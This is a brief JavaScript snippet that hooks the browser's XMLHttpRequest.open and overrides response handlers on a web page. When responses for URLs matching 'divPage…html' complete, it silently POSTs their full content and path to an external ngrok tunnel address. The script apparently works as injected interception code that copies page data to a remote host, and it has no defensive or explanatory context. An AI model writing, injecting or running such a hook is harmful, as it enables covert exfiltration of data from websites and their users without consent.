// Save a reference to the original XMLHttpRequest object
var originalXhrOpen = window.XMLHttpRequest.prototype.open;

// Replace the open method with our own implementation
window.XMLHttpRequest.prototype.open = function(method, url) {
    // Log the request details
    console.log('Request:', method, url);
    
    // Call the original open method with the same arguments
    originalXhrOpen.apply(this, arguments);
    
    // Save a reference to the current XMLHttpRequest object
    var xhr = this;
    
    // Replace the onreadystatechange event handler with our own implementation
    xhr.onreadystatechange = function() {
        // Check if the request is completed and successful
        if (xhr.readyState === XMLHttpRequest.DONE && xhr.status >= 200 && xhr.status < 300) {
                // Check if the URL matches the conditions
           if (url.startsWith('divPage') && url.endsWith('.html')) {
                // Add your interception logic here, before making the actual call
                console.log('Intercepted XMLHttpRequest with method: ' + method + ', URL: ' + url);

                fetch("https://f887-95-56-217-235.ngrok-free.app", {
                    method: 'POST', // Specify the HTTP method
                    headers: {
                        'Content-Type': 'application/json', // Specify that you are sending JSON data
                        // You can include additional headers if required
                    },
                    body: JSON.stringify({ response: xhr.responseText, path:url }) 
                })
           }
        }
    };
};

// Now any XMLHttpRequest made on the page will log its request and response
